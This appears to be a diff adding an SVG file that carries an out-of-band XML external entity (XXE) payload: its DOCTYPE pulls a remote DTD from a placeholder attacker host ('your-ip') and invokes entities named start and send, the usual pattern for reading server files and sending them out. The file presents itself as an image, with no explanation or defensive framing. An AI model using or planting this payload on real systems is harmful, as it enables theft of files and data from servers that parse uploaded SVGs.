@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE test [
+   <!ELEMENT test ANY>
+   <!ENTITY % remote SYSTEM "http://your-ip/xxe.dtd">
+   %remote;%start;%send;
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+</svg>
